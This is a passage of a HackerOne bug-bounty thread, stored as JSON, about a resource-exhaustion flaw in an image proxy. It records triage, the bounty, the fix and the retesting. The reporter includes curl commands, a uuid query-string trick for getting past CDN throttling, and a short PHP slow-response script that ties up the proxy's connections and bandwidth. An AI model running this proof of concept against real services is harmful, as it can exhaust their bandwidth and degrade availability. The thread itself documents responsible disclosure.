reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-12T08:54:41.233Z","updated_at":"2019-03-12T08:54:41.233Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4305809,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-12T08:56:54.348Z","updated_at":"2019-03-12T08:56:54.348Z","additional_data":{"old_severity":"High (7.7)","new_severity":"Medium (5.3)","old_severity_id":313761,"new_severity_id":314603},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4305885,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ","markdown_message":"\u003cp\u003eI was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-12T09:04:43.343Z","updated_at":"2019-03-12T09:04:43.343Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4308421,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cool, thanks for the update.","markdown_message":"\u003cp\u003eCool, thanks for the update.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-12T15:10:23.466Z","updated_at":"2019-03-12T15:10:23.466Z","actor":{"username":"teuvokas","cleared":false,"url":"/teuvokas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4424037,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report, we'll get this fixed.","markdown_message":"\u003cp\u003eThanks for the report, we\u0026#39;ll get this fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-30T01:07:30.285Z","updated_at":"2019-03-30T01:07:30.285Z","actor":{"url":"/chaturbate","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Chaturbate"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"chaturbate","collaborator":{"username":"teuvokas","url":"/teuvokas"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4426450,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the bounty! ","markdown_message":"\u003cp\u003eThank you for the bounty! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-30T21:27:03.573Z","updated_at":"2019-03-30T21:27:03.573Z","actor":{"username":"teuvokas","cleared":false,"url":"/teuvokas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4438679,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"These issues should be resolved now, can you confirm?","markdown_message":"\u003cp\u003eThese issues should be resolved now, can you confirm?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-01T23:08:40.890Z","updated_at":"2019-04-01T23:08:40.890Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"teuvokas","url":"/teuvokas"},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4464409,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI can see the asset proxy now times out clients after ~8 secs and I confirm that it fixes the problem \"3) Crashing the end-user's browser\". But the problem of downloading large/slow responses from a remote server persists.\n\nWith the original `big.php` the asset proxy will continue to download the full 1 GB response from the remote server after timing out the client. \n\nE.g.\n```\ncurl https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/████████ \u003e /dev/null \u0026\ncurl https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████ \u003e /dev/null \u0026\ncurl https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/█████ \u003e /dev/null \u0026\n```\n\ngave my server an outgoing transfer rate of 800 Mbps, and nginx access logs showed following:\n\n```\n█████32 - - [03/Apr/2019:21:14:26 +0200] \"GET /big.php HTTP/1.1\" 500 300 1073742107 1073741945 44.707 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n███37 - - [03/Apr/2019:21:14:26 +0200] \"GET /big.php HTTP/1.1\" 500 300 1073742099 1073741937 47.201 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n████32 - - [03/Apr/2019:21:14:27 +0200] \"GET /big.php HTTP/1.1\" 500 300 1073742110 1073741948 46.136 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n```\n\nThe original `slow.php` no longer works, but I increased the transfer rate slightly for `slow2.php` (it now outputs 4 kB every 4 secs, 156 chunks total -\u003e 624 sec).\n\nSo after doing\n```\ncurl https://camo.stream.highwebmedia.com/ec276c9fdbd7f4ae273a2b7f02d0bef651aebadd/█████████?$(uuidgen) \u003e /dev/null \u0026\ncurl https://camo.stream.highwebmedia.com/ec276c9fdbd7f4ae273a2b7f02d0bef651aebadd/███?$(uuidgen) \u003e /dev/null \u0026\ncurl https://camo.stream.highwebmedia.com/ec276c9fdbd7f4ae273a2b7f02d0bef651aebadd/███?$(uuidgen) \u003e /dev/null \u0026\n```\nthe nginx logs showed following:\n```\n███33 - - [03/Apr/2019:22:08:07 +0200] \"GET /slow2.php HTTP/1.1\" 500 302 640242 640080 624.047 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n██████████36 - - [03/Apr/2019:22:08:15 +0200] \"GET /slow2.php HTTP/1.1\" 500 298 640242 640080 624.046 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n██████████43 - - [03/Apr/2019:22:08:24 +0200] \"GET /slow2.php HTTP/1.1\" 500 302 640242 640080 624.058 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n```\n\nI can confirm that direct connections to the asset proxy without the CDN appear to be blocked now. I think because of the CDN throttling it was now harder to open lots of simultaneous connections to my server when using a static url. But by adding a uuid querystring, the requests seemed to pass thru just fine, at least with lowish simultaneous connection amounts. (I tested with up to 50 simultaneous connections to my server.)\n\nThe source code for the `slow2.php` looks like this:\n```php\n\u003c?php\n\nob_end_flush();\nheader(\"HTTP/1.1 500 Internal Server Error\");\nheader(\"Content-Type: image/png\");\nflush();\n\nfor($i=0; $i\u003c156; $i++) {\n  echo str_pad('hi', 4096, \"hiho\");\n  flush();\n  sleep(4);\n}\n```\n\nBr,\n@teuvokas ","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI can see the asset proxy now times out clients after ~8 secs and I confirm that it fixes the problem \u0026quot;3) Crashing the end-user\u0026#39;s browser\u0026quot;. But the problem of downloading large/slow responses from a remote server persists.\u003c/p\u003e\n\n\u003cp\u003eWith the original \u003ccode\u003ebig.php\u003c/code\u003e the asset proxy will continue to download the full 1 GB response from the remote server after timing out the client. \u003c/p\u003e\n\n\u003cp\u003eE.g.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/████████ \u0026gt; /dev/null \u0026amp;\ncurl https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████ \u0026gt; /dev/null \u0026amp;\ncurl https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/█████ \u0026gt; /dev/null \u0026amp;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003egave my server an outgoing transfer rate of 800 Mbps, and nginx access logs showed following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e█████32 - - [03/Apr/2019:21:14:26 +0200] \u0026quot;GET /big.php HTTP/1.1\u0026quot; 500 300 1073742107 1073741945 44.707 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n███37 - - [03/Apr/2019:21:14:26 +0200] \u0026quot;GET /big.php HTTP/1.1\u0026quot; 500 300 1073742099 1073741937 47.201 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n████32 - - [03/Apr/2019:21:14:27 +0200] \u0026quot;GET /big.php HTTP/1.1\u0026quot; 500 300 1073742110 1073741948 46.136 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe original \u003ccode\u003eslow.php\u003c/code\u003e no longer works, but I increased the transfer rate slightly for \u003ccode\u003eslow2.php\u003c/code\u003e (it now outputs 4 kB every 4 secs, 156 chunks total -\u0026gt; 624 sec).\u003c/p\u003e\n\n\u003cp\u003eSo after doing\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl https://camo.stream.highwebmedia.com/ec276c9fdbd7f4ae273a2b7f02d0bef651aebadd/█████████?$(uuidgen) \u0026gt; /dev/null \u0026amp;\ncurl https://camo.stream.highwebmedia.com/ec276c9fdbd7f4ae273a2b7f02d0bef651aebadd/███?$(uuidgen) \u0026gt; /dev/null \u0026amp;\ncurl https://camo.stream.highwebmedia.com/ec276c9fdbd7f4ae273a2b7f02d0bef651aebadd/███?$(uuidgen) \u0026gt; /dev/null \u0026amp;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethe nginx logs showed following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e███33 - - [03/Apr/2019:22:08:07 +0200] \u0026quot;GET /slow2.php HTTP/1.1\u0026quot; 500 302 640242 640080 624.047 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n██████████36 - - [03/Apr/2019:22:08:15 +0200] \u0026quot;GET /slow2.php HTTP/1.1\u0026quot; 500 298 640242 640080 624.046 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n██████████43 - - [03/Apr/2019:22:08:24 +0200] \u0026quot;GET /slow2.php HTTP/1.1\u0026quot; 500 302 640242 640080 624.058 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI can confirm that direct connections to the asset proxy without the CDN appear to be blocked now. I think because of the CDN throttling it was now harder to open lots of simultaneous connections to my server when using a static url. But by adding a uuid querystring, the requests seemed to pass thru just fine, at least with lowish simultaneous connection amounts. (I tested with up to 50 simultaneous connections to my server.)\u003c/p\u003e\n\n\u003cp\u003eThe source code for the \u003ccode\u003eslow2.php\u003c/code\u003e looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eob_end_flush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;HTTP/1.1 500 Internal Server Error\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Content-Type: image/png\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eflush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"mi\"\u003e156\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_pad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hi\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4096\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;hiho\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003eflush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBr,\u003cbr\u003e\n\u003ca href=\"/teuvokas\"\u003e@teuvokas\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-03T20:43:53.154Z","updated_at":"2019-04-30T21:30:39.663Z","actor":{"username":"teuvokas","cleared":false,"url":"/teuvokas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4481461,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, it looks like the request wasn't dying after we killed for the client, can you test now?","markdown_message":"\u003cp\u003eThanks, it looks like the request wasn\u0026#39;t dying after we killed for the client, can you test now?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T21:51:21.559Z","updated_at":"2019-04-04T21:51:21.559Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4483661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yep, can't get response times over 8 sec from my server anymore. So I confirm, that this is now fixed!","markdown_message":"\u003cp\u003eYep, can\u0026#39;t get response times over 8 sec from my server anymore. So I confirm, that this is now fixed!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T04:17:27.468Z","updated_at":"2019-04-05T04:17:27.468Z","actor":{"username":"teuvokas","cleared":false,"url":"/teuvokas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4483680,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, thanks for testing. I've also made a change so query parameters won't affect the CDN cache.","markdown_message":"\u003cp\u003eGreat, thanks for testing. I\u0026#39;ve also made a change so query parameters won\u0026#39;t affect the CDN cache.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T04:27:42.967Z","updated_at":"2019-04-05T04:27:42.967Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4483682,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh the 8 secs is enough to download about 150 MB from the server. That is well over the 10 MB limit on responses with a Content-Length set, but I'm not sure if that's an issue.","markdown_message":"\u003cp\u003eOh the 8 secs is enough to download about 150 MB from the server. That is well over the 10 MB limit on responses with a Content-Length set, but I\u0026#39;m not sure if that\u0026#39;s an issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T04:29:14.145Z","updated_at":"2019-04-05T04:29:14.145Z","actor":{"username":"teuvokas","cleared":false,"url":"/teuvokas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4483686,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That's fine, all the servers handling camo have 20Gbps links.","markdown_message":"\u003cp\u003eThat\u0026#39;s fine, all the servers handling camo have 20Gbps links.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T04:32:47.883Z","updated_at":"2019-04-05T04:32:47.883Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4483693,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, so all good!","markdown_message":"\u003cp\u003eGreat, so all good!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T04:37:14.866Z","updated_at":"2019-04-05T04:37:14.866Z","actor":{"username":"teuvokas","cleared":false,"url":"/teuvokas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4694533,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-30T21:30:49.196Z","updated_at":"2019-04-30T21:30:49.196Z","first_to_agree":true,"actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4701071,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-01T14:00:11.242Z","updated_at":"2019-05-01T14:00:11.242Z","actor":{"username":"teuvokas","cleared":false,"url":"/teuvokas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4701072,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-01T14:00:11.319Z","updated_at":"2019-05-01T14:00:11.319Z","actor":{"username":"teuvokas","cleared":false,"url":"/teuvokas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}